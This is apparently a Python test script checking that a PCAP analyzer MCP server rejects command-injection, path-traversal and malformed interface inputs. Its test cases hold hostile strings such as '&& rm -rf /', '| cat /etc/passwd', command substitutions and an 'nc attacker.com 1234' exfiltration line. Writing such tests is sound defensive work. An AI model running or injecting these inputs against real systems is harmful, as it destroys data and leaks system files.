#!/usr/bin/env python3
"""Security Control Verification Script for PCAP Analyzer MCP Server."""

import sys
from pathlib import Path

# Add the package to path
sys.path.insert(0, str(Path(__file__).parent))

from awslabs.pcap_analyzer_mcp_server.server import PCAPAnalyzerServer
import asyncio


async def test_command_injection_prevention():
    """Test that command injection attempts are blocked."""
    server = PCAPAnalyzerServer()
    
    test_cases = [
        # Shell metacharacters
        ('; echo hacked', 'shell metacharacters'),
        ('$(whoami)', 'command substitution'),
        ('`id`', 'backtick substitution'),
        ('| cat /etc/passwd', 'pipe operator'),
        ('&& rm -rf /', 'chaining operator'),
        
        # Path traversal
        ('../../../etc/passwd', 'path traversal'),
        ('..\\..\\windows\\system32', 'windows path traversal'),
        
        # Null bytes
        ('test\x00injection', 'null byte injection'),
        
        # Quote breaking
        ("'; DROP TABLE users--", 'SQL injection style'),
        ('"; system("ls")', 'quote breaking'),
    ]
    
    print("Testing Command Injection Prevention...")
    print("=" * 60)
    
    passed = 0
    failed = 0
    
    for malicious_input, test_name in test_cases:
        try:
            # Attempt to use malicious input
            await server._run_tshark_command([malicious_input])
            print(f"❌ FAIL: {test_name} - attack not blocked!")
            failed += 1
        except (ValueError, RuntimeError) as e:
            print(f"✅ PASS: {test_name} - blocked with: {str(e)[:50]}...")
            passed += 1
        except Exception as e:
            print(f"⚠️  WARN: {test_name} - unexpected error: {str(e)[:50]}...")
    
    print(f"\n📊 Results: {passed} passed, {failed} failed")
    return failed == 0


def test_path_traversal_prevention():
    """Test that path traversal attempts are blocked."""
    server = PCAPAnalyzerServer()
    
    test_cases = [
        ('../../../etc/passwd.pcap', 'parent directory traversal'),
        ('../../secret.pcap', 'relative path traversal'),
        ('/etc/passwd.pcap', 'absolute path without validation'),
        ('test/../../secret.pcap', 'mixed path traversal'),
        ('test.txt', 'wrong extension'),
        ('test.pcap; rm -rf /', 'injection in filename'),
        ('test<script>.pcap', 'special characters'),
    ]
    
    print("\nTesting Path Traversal Prevention...")
    print("=" * 60)
    
    passed = 0
    failed = 0
    
    for malicious_path, test_name in test_cases:
        try:
            server._resolve_pcap_path(malicious_path)
            print(f"❌ FAIL: {test_name} - attack not blocked!")
            failed += 1
        except (ValueError, FileNotFoundError) as e:
            print(f"✅ PASS: {test_name} - blocked with: {str(e)[:50]}...")
            passed += 1
        except Exception as e:
            print(f"⚠️  WARN: {test_name} - unexpected error: {str(e)[:50]}...")
    
    print(f"\n📊 Results: {passed} passed, {failed} failed")
    return failed == 0


async def test_interface_validation():
    """Test that interface name validation works."""
    server = PCAPAnalyzerServer()
    
    test_cases = [
        ('eth0; rm -rf /', 'shell metacharacters'),
        ('`whoami`', 'command substitution'),
        ('$(cat /etc/passwd)', 'command injection'),
        ('a' * 100, 'excessive length'),
        ('eth0 | nc attacker.com 1234', 'network exfiltration'),
        ('../../../../../dev/null', 'path traversal'),
    ]
    
    print("\nTesting Interface Name Validation...")
    print("=" * 60)
    
    passed = 0
    failed = 0
    
    for malicious_interface, test_name in test_cases:
        try:
            await server._start_packet_capture(interface=malicious_interface, duration=1)
            print(f"❌ FAIL: {test_name} - attack not blocked!")
            failed += 1
        except (ValueError, RuntimeError) as e:
            print(f"✅ PASS: {test_name} - blocked with: {str(e)[:50]}...")
            passed += 1
        except Exception as e:
            print(f"⚠️  WARN: {test_name} - unexpected error: {str(e)[:50]}...")
    
    print(f"\n📊 Results: {passed} passed, {failed} failed")
    return failed == 0


async def main():
    """Run all security verification tests."""
    print("╔" + "=" * 58 + "╗")
    print("║" + " " * 10 + "PCAP Analyzer Security Verification" + " " * 12 + "║")
    print("╚" + "=" * 58 + "╝\n")
    
    all_passed = True
    
    # Run tests
    result1 = await test_command_injection_prevention()
    result2 = test_path_traversal_prevention()
    result3 = await test_interface_validation()
    
    all_passed = result1 and result2 and result3
    
    # Final summary
    print("\n" + "=" * 60)
    if all_passed:
        print("🎉 ALL SECURITY CONTROLS VERIFIED - SYSTEM SECURE")
    else:
        print("⚠️  SOME SECURITY TESTS FAILED - REVIEW REQUIRED")
    print("=" * 60)
    
    return 0 if all_passed else 1


if __name__ == '__main__':
    exit_code = asyncio.run(main())
    sys.exit(exit_code)
